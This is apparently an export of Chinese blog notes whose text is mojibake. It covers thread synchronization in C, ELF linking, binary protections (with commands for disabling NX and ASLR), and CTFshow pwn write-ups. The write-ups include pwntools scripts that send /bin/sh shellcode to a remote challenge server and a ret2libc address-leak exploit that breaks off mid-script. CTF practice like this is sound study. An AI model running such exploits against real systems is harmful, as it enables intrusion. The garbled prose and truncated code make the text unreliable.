QA:å¦‚ä½•åœ¨å¤šå¤„ç†å™¨ä¸ŠååŒå¤šä¸ªçº¿ç¨‹å®Œæˆä»»åŠ¡ï¼Ÿ\nåŒæ­¥ï¼šä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šéšæ—¶é—´å˜åŒ–çš„é‡åœ¨å˜åŒ–è¿‡ç¨‹ä¸­ä¿æŒä¸€å®šçš„ç›¸å¯¹å…³ç³»\nå¹¶å‘ç¨‹åºä¸­çš„åŒæ­¥ï¼šåœ¨æŸä¸ªæ—¶é—´ç‚¹å…±åŒè¾¾åˆ°äº’ç›¸å·²çŸ¥çš„çŠ¶æ€\nç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜ æ‹¬å·åŒ¹é…\nå·¦æ‹¬å·ï¼šç”Ÿäº§èµ„æºï¼Œæ”¾å…¥é˜Ÿåˆ—\nå³æ‹¬å·ï¼šä»é˜Ÿåˆ—å–å‡ºèµ„æºæ‰§è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include \u0026#34;thread.h\u0026#34; #include \u0026#34;thread-sync.h\u0026#34; int n, count = 0; mutex_t lk = MUTEX_INIT(); void Tproduce() { while (1) { retry: mutex_lock(\u0026amp;lk); if (count == n) { mutex_unlock(\u0026amp;lk); goto retry; } count++; printf(\u0026#34;(\u0026#34;); mutex_unlock(\u0026amp;lk); } } void Tconsume() { while (1) { retry: mutex_lock(\u0026amp;lk); if (count == 0) { mutex_unlock(\u0026amp;lk); goto retry; } count--; printf(\u0026#34;)\u0026#34;); mutex_unlock(\u0026amp;lk); } } int main(int argc, char *argv[]) { assert(argc == 2); n = atoi(argv[1]); setbuf(stdout, NULL); for (int i = 0; i \u0026lt; 8; i++) { create(Tproduce); create(Tconsume); } } å¦‚æœä¸ä¸ºç©ºï¼Œå°±å–å‡ºå³æ‹¬å·æ‰§è¡Œï¼Œå¦‚æœä¸æ»¡ï¼Œå°±æ”¾å·¦æ‹¬å·\næ”¹è¿›ï¼Œjoin()é˜»å¡è¿›ç¨‹ç›´è‡³çº¿ç¨‹å®Œæˆ\nConditional Variables 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026#34;thread.h\u0026#34; #include \u0026#34;thread-sync.h\u0026#34; int n, count = 0; mutex_t lk = MUTEX_INIT(); cond_t cv = COND_INIT(); void Tproduce() { while (1) { mutex_lock(\u0026amp;lk); if (count == n) { cond_wait(\u0026amp;cv, \u0026amp;lk); } printf(\u0026#34;(\u0026#34;); count++; cond_signal(\u0026amp;cv); mutex_unlock(\u0026amp;lk); } } void Tconsume() { while (1) { mutex_lock(\u0026amp;lk); if (count == 0) { pthread_cond_wait(\u0026amp;cv, \u0026amp;lk); } printf(\u0026#34;)\u0026#34;); count--; cond_signal(\u0026amp;cv); mutex_unlock(\u0026amp;lk); } } int main(int argc, char *argv[]) { assert(argc == 2); n = atoi(argv[1]); setbuf(stdout, NULL); for (int i = 0; i \u0026lt; 8; i++) { create(Tproduce); create(Tconsume); } } ä¸¤ä¸ªæ¶ˆè´¹è€…ï¼Œä¸€ä¸ªç”Ÿäº§è€…ï¼Œä»€ä¹ˆæ—¶å€™ä¼šå‡ºç°é—®é¢˜ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªconsumeråœ¨ä¸è¯¥wakeupçš„æ—¶å€™ï¼Ÿ())åŒç±»å”¤é†’\nassert()æ£€æŸ¥\nè·å–äº’æ–¥é”ï¼Œå¦‚æœä¸æ»¡è¶³æ¡ä»¶ï¼Œåˆ™è°ƒç”¨cond_waitè¿›å…¥ç­‰å¾…çŠ¶æ€ï¼Œå¹¶é‡Šæ”¾äº’æ–¥é”ï¼Œæ»¡è¶³æ¡ä»¶æ‰§è¡Œåï¼Œé‡Šæ”¾é”ï¼Œcond_signal()å”¤é†’å¦ä¸€ä¸ªè¿›ç¨‹\nå“²å­¦å®¶åƒé¥­é—®é¢˜ åƒé¥­éœ€è¦åŒæ—¶å¾—åˆ°å·¦æ‰‹å’Œå³æ‰‹çš„å‰å­ å½“å‰å­è¢«å…¶ä»–äººå æœ‰æ—¶ï¼Œå¿…é¡»ç­‰å¾…ï¼Œå¦‚ä½•å®ŒæˆåŒæ­¥ï¼Ÿ å¦‚ä½•ç”¨äº’æ–¥é”/ä¿¡å·é‡å®ç°ï¼Ÿ å¤±è´¥çš„å°è¯•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include \u0026#34;thread.h\u0026#34; #include \u0026#34;thread-sync.h\u0026#34; #define N 3 sem_t locks[N]; void Tphilosopher(int id) { int lhs = (N + id - 1) % N; int rhs = id % N; while (1) { P(\u0026amp;locks[lhs]); //ä¸Šé”ï¼Œå¾—åˆ°å‰å­ printf(\u0026#34;T%d Got %d\\n\u0026#34;, id, lhs + 1); P(\u0026amp;locks[rhs]); printf(\u0026#34;T%d Got %d\\n\u0026#34;, id, rhs + 1); V(\u0026amp;locks[lhs]); V(\u0026amp;locks[rhs]); } } int main(int argc, char *argv[]) { for (int i = 0; i \u0026lt; N; i++) { SEM_INIT(\u0026amp;locks[i], 1);//åˆå§‹åŒ–ä¸º1 } for (int i = 0; i \u0026lt; N; i++) { create(Tphilosopher); } } é—®é¢˜ï¼šæ­»é”ï¼Ÿ\nåˆ†å¸ƒå¼ç®—æ³•ï¼šå¦‚æœæ‰€æœ‰äººå‰å­éƒ½åœ¨å³æ‰‹ä¸Šï¼Œæ²¡æœ‰äººå«é†’ç¨‹åºï¼Œçº¿ç¨‹ä¸ä¼šè¿›å±•\n1 2 3 4 5 6 7 8 9 10 11 mutex_lock(\u0026amp;mutex); while (!(avail[lhs] \u0026amp;\u0026amp; avail[rhs])) { wait(\u0026amp;cv, \u0026amp;mutex); } avail[lhs] = avail[rhs] = false; //æ”¾ä¸‹ä¸¤ä¸ªå‰å­ mutex_unlock(\u0026amp;mutex); mutex_lock(\u0026amp;mutex); avail[lhs] = avail[rhs] = true; broadcast(\u0026amp;cv); mutex_unlock(\u0026amp;mutex); Master-slaveï¼šè®©ä¸€ä¸ªäººç®¡ç†å‰å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 void Tphilosopher(int id) { send_request(id, EAT); P(allowed[id]); // waiter ä¼šæŠŠå‰å­é€’ç»™å“²å­¦å®¶ philosopher_eat(); send_request(id, DONE); } void Twaiter() { while (1) { (id, status) = receive_request(); if (status == EAT) { ... } if (status == DONE) { ... } } } å»¶ä¼¸æ€è€ƒï¼Œå¦‚æœè§‰å¾—å•çº¿ç¨‹ç®¡ç†å¤ªæ…¢ï¼Œå¯ä»¥åˆ†æ‰¹ç»™å¤šä¸ªçº¿ç¨‹ç®¡ç†ï¼Œä½†è¿™äº›ç°æˆçš„ç®¡ç†èµ„æºè¦ç‹¬ç«‹\né˜²å¾¡æ€§ç¼–ç¨‹ åˆ©ç”¨assert()\n1 2 3 CHECK_INT(waitlist-\u0026gt;count, \u0026gt;= 0); CHECK_INT(pid, \u0026lt; MAX_PROCS); CHECK_HEAP(ctx-\u0026gt;rip); CHECK_HEAP(ctx-\u0026gt;cr3); æ£€æŸ¥PIDï¼Œæ˜¯å¦åœ¨å †åŒº\næ­»é”ï¼šçº¿ç¨‹äº’ç›¸ç­‰å¾…\n","date":"2025-03-16T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/jyy%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","title":"jyyæ“ä½œç³»ç»Ÿ"},{"content":"gcc hello.c -save-temps \u0026ndash;verbose\n-save-tempsä¿å­˜ä¸­é—´ç”Ÿæˆæ–‡ä»¶\n\u0026ndash;verboseæŸ¥çœ‹è¯¦ç»†å·¥å…·æµ\né¢„å¤„ç† gcc -E hello.c -o hello.i\nç¼–è¯‘ gcc -S hello.c -o hello.s\næ±‡ç¼– gcc -c hello.s -o hello.o\né‡å®šå‘æ–‡ä»¶\nåæ±‡ç¼–\nobjdump -sd hello.o -M intel\né“¾æ¥ gcc hello.o -o hello -static\né»˜è®¤åŠ¨æ€ï¼Œ-staticæŒ‡å®šé™æ€é“¾æ¥\nobjdump -sd hello -M intel\n-M intel\næŒ‡å®šåæ±‡ç¼–çš„è¾“å‡ºæ ¼å¼ä¸º Intel è¯­æ³•ï¼ˆè€Œä¸æ˜¯é»˜è®¤çš„ AT\u0026amp;T è¯­æ³•ï¼‰ã€‚ Intel è¯­æ³•æ˜¯æ±‡ç¼–è¯­è¨€çš„ä¸€ç§å¸¸è§æ ¼å¼ï¼Œé€šå¸¸æ›´æ˜“äºé˜…è¯»ã€‚ -s é€‰é¡¹\næ˜¾ç¤ºæ–‡ä»¶çš„å®Œæ•´å†…å®¹ï¼ˆåŒ…æ‹¬åå…­è¿›åˆ¶å’Œ ASCII è¡¨ç¤ºï¼‰ã€‚ ä¾‹å¦‚ï¼Œå®ƒä¼šæ˜¾ç¤ºæ¯ä¸ªæ®µçš„åå…­è¿›åˆ¶æ•°æ®ä»¥åŠå¯¹åº”çš„ ASCII å­—ç¬¦ã€‚ -d é€‰é¡¹\nåæ±‡ç¼–æ–‡ä»¶ä¸­çš„å¯æ‰§è¡Œä»£ç æ®µã€‚ ä¾‹å¦‚ï¼Œå®ƒä¼šå°†äºŒè¿›åˆ¶ä»£ç è½¬æ¢ä¸ºæ±‡ç¼–æŒ‡ä»¤ã€‚ ELFæ–‡ä»¶ å¯æ‰§è¡Œæ–‡ä»¶.exec\nå¯é‡å®šä½æ–‡ä»¶ï¼Œå°šæœªé“¾æ¥ .rel\nå…±äº«ç›®æ ‡æ–‡ä»¶ï¼šåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶.dyc\nç»“æ„ æ–‡ä»¶å¤´ èŠ‚å¤´è¡¨ .text\n.data\n.bss\nå¯æ‰§è¡Œæ–‡ä»¶çš„è£…è½½ è¿è¡Œä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œéœ€è¦å°†è¯¥æ–‡ä»¶å’ŒåŠ¨æ€é“¾æ¥åº“è£…è½½åˆ°è¿›ç¨‹ç©ºé—´ä¸­ï¼Œå½¢æˆä¸€ä¸ªè¿›ç¨‹é•œåƒï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æ‹¥æœ‰ç‹¬ç«‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œè¿™ä¸ªç©ºé—´æ—¥å’Œå¸ƒå±€æ˜¯ç”±è®°å½•åœ¨æ®µå¤´è¡¨çš„ç¨‹åºå¤´å†³å®šçš„\nåœ°å€ç©ºé—´åˆ†é… ç›¸ä¼¼èŠ‚åˆå¹¶\né™æ€é“¾æ¥çš„è¯¦ç»†è¿‡ç¨‹ ç¬¦å·è§£æï¼šæ¯ä¸ªç¬¦å·ï¼ˆå‡½æ•°ï¼Œå˜é‡ï¼‰ä¸å®šä¹‰å…³è”\né‡å®šä½ï¼šæ¯ä¸ªç¬¦å·å®šä¹‰ä¸å†…å­˜åœ°å€å…³è”\né™æ€é“¾æ¥åº“ï¼š.a\nåŠ¨æ€é“¾æ¥ åœ¨è¿è¡Œæˆ–åŠ è½½æ—¶ï¼Œåœ¨å†…å­˜ä¸­å®Œæˆé“¾æ¥çš„è¿‡ç¨‹ï¼Œç”¨äºåŠ¨æ€è¿æ¥çš„ç³»ç»Ÿåº“å«å…±äº«åº“\nå¦‚funcq.elfå’Œfunc2.elfä¸å†åŒ…å«å•ç‹¬çš„testlib.oï¼Œè¿è¡Œfunc1.elfæ—¶ï¼Œç³»ç»Ÿå°†func1.elfå’Œä¾èµ–çš„testlib.oè£…è½½å¦‚å†…å­˜ï¼Œç„¶åè¿›è¡ŒåŠ¨æ€é“¾æ¥ï¼Œå®Œæˆåç³»ç»Ÿå°†æ§åˆ¶æƒäº¤ç»™ç¨‹åºå…¥å£ç‚¹ï¼Œå½“func2.elfæƒ³è¦æ‰§è¡Œæ—¶ï¼Œç”±äºå†…å­˜ä¸­å·²ç»æœ‰testlib.o,å› æ­¤ä¸å†é‡å¤åŠ è½½\nStack Canaries canaryçš„å€¼æ˜¯æ ˆä¸Šçš„ä¸€ä¸ªéšæœºæ•°ï¼Œåœ¨ç¨‹åºå¯åŠ¨æ—¶éšæœºç”Ÿæˆå¹¶ä¿å­˜åœ¨æ¯”å‡½æ•°è¿”å›åœ°å€æ›´ä½çš„åœ°æ–¹ï¼Œæ”»å‡»è€…è¦æƒ³æ§åˆ¶å‡½æ•°çš„è¿”å›æŒ‡é’ˆï¼Œå°±ä¸€å®šè¦å…ˆè¦†ç›–åˆ°canary,å¦‚æœè¢«æ”¹å˜ï¼Œåˆ™è®¤ä¸ºæ˜¯å‘ç”Ÿäº†æ ˆæº¢å‡º\ngccé»˜è®¤ä½¿ç”¨stack canaryä¿æŠ¤ï¼Œå…³é—­æ–¹æ³•åŠ å…¥â€œ-fno-stack-protectorâ€\nNX å¼€å¯NXä¿æŠ¤ä¸èƒ½ç›´æ¥ä½¿ç”¨shellcodeæ‰§è¡Œä»»æ„ä»£ç ï¼Œgccé»˜è®¤å¼€å¯ï¼Œå…³é—­æ–¹æ³•åŠ -z execstack\nASLR å°†ç¨‹åºçš„å †æ ˆåœ°å€å’ŒåŠ¨æ€é“¾æ¥åº“çš„åŠ è½½åœ°å€è¿›è¡Œä¸€å®šçš„éšæœºåŒ–ï¼Œè¿™äº›åœ°å€ä¹‹é—´æ˜¯ä¸å¯è¯»å†™æ‰§è¡Œçš„æœªæ˜ å°„å†…å­˜ï¼Œé™ä½æ”»å‡»è€…å¯¹ç¨‹åºå†…å­˜ç»“æ„çš„äº†è§£ç¨‹åº\nå…³é—­æ–¹å¼ï¼Œä¿®æ”¹/proc/sys/kernel/randomize_va_spaceæ–‡ä»¶çš„å†…å®¹ä¸º0\nPIE è®©ELFåœ°å€éšæœºåŒ–åŠ è½½ï¼Œä½¿å¾—ç¨‹åºçš„å†…å­˜ç»“æ„å¯¹æ”»å‡»è€…æœªçŸ¥ï¼Œè¿›ä¸€æ­¥æé«˜ç¨‹åºçš„å®‰å…¨æ€§\nå¼€å¯-fpic-pie\nå…³é—­-no-pie\nFull Relro å¼€å¯â€œ-z relroâ€\n.GOT.PLTå’Œ.PLTçš„ä½œç”¨ ä¸€ä¸ªç¨‹åºæƒ³è°ƒç”¨åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ï¼Œå¿…é¡»ä½¿ç”¨.GOT.PLTå’Œ.PLTé…åˆå®Œæˆè°ƒç”¨\n.PLTè¡¨æ˜¯ä¸€æ®µä»£ç ï¼Œä»å†…å­˜ä¸­å–å‡ºä¸€ä¸ªåœ°å€ç„¶åè·³è½¬\n.GOT.PLTè¡¨å­˜æ”¾å®é™…åœ°å€\nç”±äºLinuxçš„Lazy bindingæœºåˆ¶ï¼Œæ²¡æœ‰å¼€å¯Full Relloçš„ELFç§ï¼ŒæŸä¸ªå‡½æ•°å¿…é¡»è¢«è°ƒç”¨ï¼Œ.GOT.PLTè¡¨æ‰ä¼šå­˜æ”¾å‡½æ•°çš„çœŸå®åœ°å€\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int __cdecl main(int argc, const char **argv, const char **envp)`: è¿™æ˜¯ `main` å‡½æ•°çš„å®šä¹‰ï¼Œå®ƒæ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ç¨‹åºçš„å‚æ•°æ•°é‡ `argc`ã€å‚æ•°åˆ—è¡¨ `argv` å’Œç¯å¢ƒå˜é‡ `envp v6 = __readfsqword(0x28u);: è¿™ä¸€è¡Œè¯»å–äº† FS å¯„å­˜å™¨åç§» 0x28 å¤„çš„å€¼å¹¶å­˜å‚¨åˆ° v6 ä¸­ setvbuf(_bss_start, 0LL, 2, 0LL); å’Œ setvbuf(stdin, 0LL, 2, 0LL);: è¿™ä¸¤è¡Œè°ƒç”¨äº† setvbuf å‡½æ•°ï¼Œç”¨äºè®¾ç½®ç¼“å†²åŒºç±»å‹ã€‚ç¬¬ä¸€ä¸ªè°ƒç”¨å°† _bss_start çš„ç¼“å†²åŒºç±»å‹è®¾ç½®ä¸ºæ— ç¼“å†²ï¼Œç¬¬äºŒä¸ªè°ƒç”¨å°†æ ‡å‡†è¾“å…¥çš„ç¼“å†²åŒºç±»å‹è®¾ç½®ä¸ºæ— ç¼“å†²ã€‚ strcpy(s1, \u0026#34;CTFshowPWN\u0026#34;);: è¿™è¡Œå°†å­—ç¬¦ä¸² \u0026#34;CTFshowPWN\u0026#34; å¤åˆ¶åˆ° s1 æ•°ç»„ä¸­ if ( !strcmp(s1, s2) ) execve_func();: è¿™è¡Œä½¿ç”¨ strcmp å‡½æ•°æ¯”è¾ƒ s1 å’Œ s2 æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰ï¼Œåˆ™è°ƒç”¨ execve_func å‡½æ•°ã€‚ setvbuf: è¿™ä¸ªå‡½æ•°ç”¨äºè®¾ç½®æ–‡ä»¶æµçš„ç¼“å†²åŒºç±»å‹ã€‚å®ƒå…è®¸ç¨‹åºå‘˜æ§åˆ¶æ ‡å‡† I/O åº“ä¸­æ–‡ä»¶æµçš„ç¼“å†²æ–¹å¼ã€‚é€šå¸¸ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ–‡ä»¶æµè®¾ç½®ä¸ºæ— ç¼“å†²ã€è¡Œç¼“å†²æˆ–å…¨ç¼“å†²ã€‚åœ¨è¿™ä¸ªä»£ç ä¸­ï¼Œsetvbuf å‡½æ•°è¢«ç”¨äºè®¾ç½® _bss_start å’Œæ ‡å‡†è¾“å…¥æµ stdin çš„ç¼“å†²ç±»å‹ä¸ºæ— ç¼“å†²ï¼Œè¿™æ„å‘³ç€æ¯æ¬¡è¾“å‡ºéƒ½ä¼šç«‹å³è¢«å†™å…¥ï¼Œè€Œä¸ä¼šå…ˆç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚ strcpy: è¿™ä¸ªå‡½æ•°ç”¨äºå°†ä¸€ä¸ªå­—ç¬¦ä¸²å¤åˆ¶åˆ°å¦ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ä¸­ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®æ ‡å­—ç¬¦ä¸²æ•°ç»„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æºå­—ç¬¦ä¸²ã€‚strcpy ä¼šå°†æºå­—ç¬¦ä¸²çš„å†…å®¹é€ä¸ªå­—ç¬¦åœ°å¤åˆ¶åˆ°ç›®æ ‡å­—ç¬¦ä¸²æ•°ç»„ä¸­ï¼Œç›´åˆ°é‡åˆ°æºå­—ç¬¦ä¸²çš„ç»“æŸç¬¦ \\0ã€‚ puts: puts å‡½æ•°ç”¨äºå‘æ ‡å‡†è¾“å‡ºæ‰“å°å­—ç¬¦ä¸²ï¼Œå¹¶åœ¨æœ€åè‡ªåŠ¨æ·»åŠ ä¸€ä¸ªæ¢è¡Œç¬¦ \\nã€‚å®ƒæ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œå¹¶å°†å…¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºæµä¸­ã€‚ scanf: è¿™ä¸ªå‡½æ•°ç”¨äºä»æ ‡å‡†è¾“å…¥æµä¸­è¯»å–è¾“å…¥ã€‚å®ƒæ¥å—æ ¼å¼åŒ–å­—ç¬¦ä¸²ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç”¨äºæŒ‡å®šè¾“å…¥çš„æ ¼å¼ï¼Œä»¥åŠä¸€ç³»åˆ—æŒ‡å‘å˜é‡çš„æŒ‡é’ˆï¼Œç”¨äºå­˜å‚¨è¯»å–åˆ°çš„å€¼ã€‚åœ¨è¿™ä¸ªä»£ç ä¸­ï¼Œscanf è¢«ç”¨äºä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶å­˜å‚¨åˆ° s2 å­—ç¬¦æ•°ç»„ä¸­ã€‚ strcmp: è¿™ä¸ªå‡½æ•°ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ã€‚å®ƒæ¥å—ä¸¤ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ•´æ•°å€¼ï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰åˆ™è¿”å›0ï¼Œå¦åˆ™è¿”å›å®ƒä»¬ç¬¬ä¸€ä¸ªä¸ç›¸ç­‰å­—ç¬¦çš„ ASCII å·®å€¼ã€‚åœ¨è¿™ä¸ªä»£ç ä¸­ï¼Œstrcmp ç”¨äºæ¯”è¾ƒ s1 å’Œ s2 æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰åˆ™è¿”å›0ï¼Œç¨‹åºå°†æ‰§è¡Œ execve_func å‡½æ•°ã€‚ execve(\u0026#34;/bin/sh\u0026#34;, argv, 0LL);: è¿™ä¸€è¡Œè°ƒç”¨äº† execve å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œä¸€ä¸ªç¨‹åºã€‚å®ƒæ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯è¦æ‰§è¡Œçš„ç¨‹åºè·¯å¾„ã€å‚æ•°åˆ—è¡¨å’Œç¯å¢ƒå˜é‡åˆ—è¡¨ã€‚åœ¨è¿™é‡Œï¼Œå®ƒæ‰§è¡Œäº† /bin/shï¼Œå¹¶ä¼ é€’äº†ä¸€ä¸ªç©ºçš„å‚æ•°åˆ—è¡¨å’Œç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œè¡¨ç¤ºæ²¡æœ‰é¢å¤–çš„å‚æ•°å’Œç¯å¢ƒå˜é‡ã€‚ IDAè½¬æ¢æ•°æ®ï¼šCï¼ˆè½¬æ¢ä¸ºä»£ç ï¼‰ã€Dï¼ˆè½¬æ¢ä¸ºæ•°æ®ï¼‰ã€Aï¼ˆè½¬æ¢ä¸ºå­—ç¬¦ï¼‰ã€Nï¼ˆä¸ºæ ‡ç­¾é‡å‘½å)\nchecksecæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯\nread()è¯»å–\nstrcat()èµ‹å€¼\nsystem()è°ƒç”¨\necho\u0026raquo;åœ¨æ–‡ä»¶åé¢è¿½åŠ å†…å®¹\necho\u0026gt;è¦†ç›–æ–‡ä»¶\nfork()åˆ›å»ºäº†å­è¿›ç¨‹ï¼Œfclose(_bss_star)å…³é—­äº†è¾“å‡ºæµï¼Œå³ä½¿åé¢å†è¾“å…¥ï¼Œä¹Ÿä¸ä¼šæœ‰å›æ˜¾ï¼Œåœ¨å‘½ä»¤ååŠ ä¸Š\u0026gt;\u0026amp;0 ï¼Œå°†å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥ï¼Œä¹Ÿå°±æ˜¯å°†å‘½ä»¤çš„è¾“å‡ºå†…å®¹å‘é€åˆ°ä¸ç»ˆç«¯æˆ–é”®ç›˜å…³è”çš„åœ°æ–¹\né“¾æ¥é‡å®šä½ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 .text ... // è°ƒç”¨printfçš„callæŒ‡ä»¤ call printf_stub ... printf_stub: mov rax, [printfå‡½æ•°çš„å‚¨å­˜åœ°å€] // è·å–printfé‡å®šä½ä¹‹åçš„åœ°å€ jmp rax // è·³è¿‡å»æ‰§è¡Œprintfå‡½æ•° .data ... printfå‡½æ•°çš„å‚¨å­˜åœ°å€ï¼š è¿™é‡Œå‚¨å­˜printfå‡½æ•°é‡å®šä½åçš„åœ°å€ .gotå’Œ.got.pltæ˜¯å¦å¯å†™ä¸RELROæœ‰å…³ï¼Œè¿™æ˜¯linuxç³»ç»Ÿä¸‹å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€ç§ä¿æŠ¤æœºåˆ¶ï¼Œå®ƒç”¨äºå¢å¼ºç¨‹åºçš„å®‰å…¨æ€§ï¼Œç‰¹åˆ«æ˜¯é’ˆå¯¹å…±äº«åº“çš„æ”»å‡»ã€‚RELROæœºåˆ¶é€šè¿‡å°†éƒ¨åˆ†ELFæ®µæ ‡è®°ä¸ºåªè¯»ï¼Œé˜²æ­¢æ”»å‡»è€…åˆ©ç”¨å…¨å±€åç§»è¡¨ï¼ˆGOTï¼‰å’Œè¿‡ç¨‹é“¾æ¥è¡¨ï¼ˆPLTï¼‰è¿›è¡Œæ”»å‡»ã€‚è§„å®šå¦‚ä¸‹ï¼š\nå½“RELROä¸ºPartial RELROæ—¶ï¼Œè¡¨ç¤º.gotä¸å¯å†™è€Œ.got.pltå¯å†™ã€‚ å½“RELROä¸ºFullRELROæ—¶ï¼Œè¡¨ç¤º.gotä¸å¯å†™.got.pltä¹Ÿä¸å¯å†™ã€‚ å½“RELROä¸ºNo RELROæ—¶ï¼Œè¡¨ç¤º.gotä¸.got.pltéƒ½å¯å†™ã€‚\nå¯ä»¥é€šè¿‡checksecå‘½ä»¤æ¥è·å–å¯æ‰§è¡Œæ–‡ä»¶çš„éƒ¨åˆ†ä¿æŠ¤æœºåˆ¶ä¿¡æ¯ã€‚\nå¯ä»¥é€šè¿‡readelf -Så‘½ä»¤æŸ¥çœ‹æ–‡ä»¶çš„å„ä¸ªæ®µçš„è¯¦ç»†ä¿¡æ¯ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº†.gotå’Œ.got.pltè¡¨çš„åœ°å€ ç”¨objdump -h pwnå‘½ä»¤æŸ¥çœ‹elfå¤´ä¿¡æ¯ï¼ŒVMAå³åœ°å€ï¼ˆè™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€ç›¸åŒ)\nåªè¦ä¼ å‚srcï¼Œé•¿åº¦å¤§äº0x3Eh+0x4å°±ä¼šå‘ç”Ÿæº¢å‡º,ä½¿ç”¨./(file)ä¼ å‚\npwn24 è°ƒç”¨readå‡½æ•°ï¼Œè¯»å–è¾“å…¥ï¼Œå­˜å…¥[ebp+buf]ä¸­ï¼Œlea eax [ebp+buf]æŠŠåœ°å€å­˜å…¥eaxä¸­ï¼Œç„¶åï¼Œcall eaxæ‰§è¡Œ\nNXæ˜¯disablesï¼Œè¯´æ˜å¯ä»¥ç”¨shellcodeè¿›è¡Œæ”»å‡»\n1 2 3 4 5 from pwn import * p=remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;,28284)#ä¸æœåŠ¡å™¨çš„pwnæ–‡ä»¶å»ºç«‹è”ç³» shell=asm(shellcraft.sh())#åˆ©ç”¨shellcraftæ¨¡å—ç”Ÿæˆè°ƒç”¨ç³»ç»Ÿshellï¼ˆ/bin/shï¼‰çš„shellcodeã€‚è¿™ä¸ªshellcodeå¯ä»¥ç”¨äºæ‰§è¡Œå‘½ä»¤è¡Œå‘½ä»¤ p.sendline(shell)#å‘è¿œç¨‹å‘é€shellcode p.interactive()#å»ºç«‹äº¤äº’å¼å¯¹è¯ å°±è·å¾—æ§åˆ¶å°æƒé™äº†\npwn25 ret2libc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; p = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28162) elf = ELF(\u0026#39;pwn1\u0026#39;) offset = 0x88 + 0x4 puts_plt = elf.symbols[\u0026#39;puts\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] # payloadï¼š0x88+0x4ä¸ªæ— ç”¨å¡«å……å­—ç¬¦è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œ # å°†putså‡½æ•°pltè¡¨åœ°å€åšè¿”å›åœ°å€ï¼Œä»£è¡¨ctfshowå‡½æ•°æ‰§è¡Œå®Œä¼šæ‰§è¡Œputså‡½æ•°ï¼Œ # main_addræ˜¯putså‡½æ•°æ‰§è¡Œå®Œåçš„è¿”å›åœ°å€ï¼Œä½¿ç”¨putså‡½æ•°æ‰§è¡Œå®Œåå›åˆ°mainå‡½æ•°ç»§ç»­åˆ©ç”¨æº¢å‡ºæ¼æ´ # putså‡½æ•°gotè¡¨ä¸­çš„åœ°å€ä½œä¸ºputså‡½æ•°æ‰§è¡Œçš„å‚æ•°ï¼Œè®©putså‡½æ•°è¾“å‡ºputså‡½æ•°åœ¨å†…å­˜çš„åœ°å€ payload = b\u0026#39;a\u0026#39; * offset + p32(puts_plt) + p32(main) + p32(puts_got) p.sendline(payload) # æ¥æ”¶putså‡½æ•°è¾“å‡ºçš„putså‡½æ•°åœ¨å†…å­˜çš„åœ°å€ puts_addr = u32(p.recv()[0:4]) print(hex(puts_addr)) # åœ¨æ ¹æ®å†…å­˜ä¸­putså‡½æ•°çš„åœ°å€å¯»æ‰¾ç›¸åº”çš„libcç‰ˆæœ¬ä¸­putså‡½æ•°çš„åœ°å€ libc = LibcSearcher(\u0026#34;puts\u0026#34;,puts_addr) # 